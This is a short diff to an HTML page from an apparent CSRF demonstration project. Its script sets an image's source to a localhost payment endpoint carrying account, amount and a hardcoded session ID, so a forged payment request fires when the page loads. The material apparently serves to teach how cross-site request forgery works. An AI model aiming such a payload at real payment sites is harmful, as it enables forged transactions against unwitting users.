@@ -4,7 +4,7 @@
 </head>
 <body>
 <div>
-<img src="" alt="Image" id="im"/>
+<img src="https://static.pexels.com/photos/248797/pexels-photo-248797.jpeg" alt="Image" id="im"/>
 </div>
 </body>
 <script>
@@ -12,6 +12,6 @@
    var acc = doc.getElementById('acc_no2');
    var amt = doc.getElementById('amt2');   
    var link_rel = "http://localhost:81/CSRFDemonstration/Reflected/handle_payments.php?acc_no=" + acc + "&amount=" + amt + "&sessionID=elsm34cmmpbed371b3li7sd6j3";
-   doc.getElementById("im").src = link_rel;
+   window.document.getElementById("im").src = link_rel;
 </script>
 </html>
